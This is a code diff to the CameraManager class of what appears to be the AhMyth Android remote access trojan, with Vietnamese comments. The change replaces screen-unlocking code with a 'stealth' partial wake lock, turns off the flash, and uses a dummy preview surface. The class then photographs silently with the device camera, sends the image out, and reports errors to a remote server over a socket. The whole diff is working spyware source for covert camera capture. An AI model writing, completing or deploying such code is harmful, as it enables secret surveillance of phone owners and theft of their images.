@@ -32,8 +32,6 @@ public class CameraManager {
     private Context context;
     private Camera camera;
     private PowerManager.WakeLock wakeLock;
-    private KeyguardManager.KeyguardLock keyguardLock;
-    private boolean wasScreenLocked = false;
     private int currentCameraId = -1;  // Track current camera ID
 
     public CameraManager(Context context) {
@@ -41,87 +39,35 @@ public class CameraManager {
     }
 
     /**
-     * Chụp ảnh - Tự động xử lý màn hình khóa
+     * Chụp ảnh - Tự động xử lý
      */
     public void startUp(int cameraID) {
         try {
-            // Bước 1: Mở khóa màn hình nếu cần
-            unlockScreen();
+            // Chỉ giữ Wakelock để CPU chạy, không bật màn hình (Stealth)
+            acquireWakeLock();
             
-            // Bước 2: Đợi một chút để màn hình sáng
-            Thread.sleep(500);
-            
-            // Bước 3: Mở camera và chụp
+            // Mở camera và chụp
             capturePhoto(cameraID);
             
         } catch (Exception e) {
             Log.e(TAG, "Error in startUp", e);
-            relockScreen();
+            releaseWakeLock();
         }
     }
 
-    /**
-     * Mở khóa màn hình tạm thời
-     */
-    private void unlockScreen() {
-        try {
+    private void acquireWakeLock() {
+        if (wakeLock == null) {
             PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
-            
-            // Kiểm tra xem màn hình có đang khóa không
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
-                wasScreenLocked = !pm.isInteractive();
-            } else {
-                wasScreenLocked = !pm.isScreenOn();
-            }
-            
-            if (wasScreenLocked) {
-                Log.d(TAG, "Screen is locked, unlocking...");
-                
-                // Bật màn hình
-                wakeLock = pm.newWakeLock(
-                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK | 
-                    PowerManager.ACQUIRE_CAUSES_WAKEUP,
-                    "CameraManager:WakeLock"
-                );
-                wakeLock.acquire(10000); // 10 giây
-                
-                // Mở khóa màn hình (chỉ hoạt động trên Android cũ)
-                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
-                    KeyguardManager km = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
-                    keyguardLock = km.newKeyguardLock("CameraManager");
-                    keyguardLock.disableKeyguard();
-                }
-                
-                Log.d(TAG, "Screen unlocked successfully");
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "Error unlocking screen", e);
+            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AhMyth:CameraWakeLock");
+        }
+        if (!wakeLock.isHeld()) {
+            wakeLock.acquire(10000); // 10s timeout
         }
     }
 
-    /**
-     * Khóa lại màn hình nếu trước đó đang khóa
-     */
-    private void relockScreen() {
-        try {
-            if (wasScreenLocked) {
-                Log.d(TAG, "Relocking screen...");
-                
-                // Tắt wake lock
-                if (wakeLock != null && wakeLock.isHeld()) {
-                    wakeLock.release();
-                }
-                
-                // Khóa lại màn hình (chỉ hoạt động trên Android cũ)
-                if (keyguardLock != null && Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
-                    keyguardLock.reenableKeyguard();
-                }
-                
-                wasScreenLocked = false;
-                Log.d(TAG, "Screen relocked");
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "Error relocking screen", e);
+    private void releaseWakeLock() {
+        if (wakeLock != null && wakeLock.isHeld()) {
+            wakeLock.release();
         }
     }
 
@@ -130,43 +76,50 @@ public class CameraManager {
      */
     private void capturePhoto(int cameraID) {
         try {
-            currentCameraId = cameraID;  // Save camera ID
+            currentCameraId = cameraID;
             camera = Camera.open(cameraID);
             Parameters parameters = camera.getParameters();
             
-            // Tắt flash để tránh phát hiện
+            // Tắt flash/sound
             parameters.setFlashMode(Parameters.FLASH_MODE_OFF);
-            
-            // Tắt shutter sound nếu có thể
-            try {
-                camera.enableShutterSound(false);
-            } catch (Exception e) {
-                // Ignore - một số thiết bị không hỗ trợ
-            }
+            // Một số máy không hỗ trợ setRotation trong parameters, ta xoay bitmap sau
             
             camera.setParameters(parameters);
             
-            // Sử dụng SurfaceTexture ảo để không hiển thị preview
-            camera.setPreviewTexture(new SurfaceTexture(0));
+            // Dummy SurfaceTexture để lừa Camera là đang hiển thị preview
+            // 10 is a magic number texture ID
+            SurfaceTexture dummy = new SurfaceTexture(10);
+            camera.setPreviewTexture(dummy);
+            
             camera.startPreview();
             
-            // Đợi camera focus (nếu có)
-            Thread.sleep(300);
+            // Cần delay nhỏ để camera khởi động preview
+            try { Thread.sleep(1000); } catch (InterruptedException e) {}
             
-            // Chụp ảnh
             camera.takePicture(null, null, new PictureCallback() {
                 @Override
                 public void onPictureTaken(byte[] data, Camera camera) {
-                    releaseCamera();
-                    sendPhoto(data);
-                    relockScreen(); // Khóa lại màn hình sau khi chụp xong
+                    try {
+                        sendPhoto(data);
+                    } finally {
+                        releaseCamera(); // Release camera ngay sau khi chụp
+                        releaseWakeLock(); // Release wakelock
+                    }
                 }
             });
             
         } catch (Exception e) {
             Log.e(TAG, "Error capturing photo", e);
+            // Nếu lỗi, phải release ngay
             releaseCamera();
-            relockScreen();
+            releaseWakeLock();
+            
+            // Thử gửi log lỗi về server
+            try {
+                JSONObject err = new JSONObject();
+                err.put("error", "Camera failed: " + e.getMessage());
+                IOSocket.getInstance().getIoSocket().emit("x0000ca", err);
+            } catch (Exception ex) {}
         }
     }
 
